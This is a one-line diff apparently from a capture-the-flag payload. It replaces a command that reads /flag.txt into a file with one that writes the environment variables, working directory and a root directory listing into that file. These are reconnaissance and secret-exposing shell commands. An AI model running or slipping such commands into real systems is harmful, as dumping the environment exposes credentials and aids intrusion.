@@ -1,1 +1,1 @@
-cat /flag.txt>o
+env>o;pwd>>o;ls -la />>o
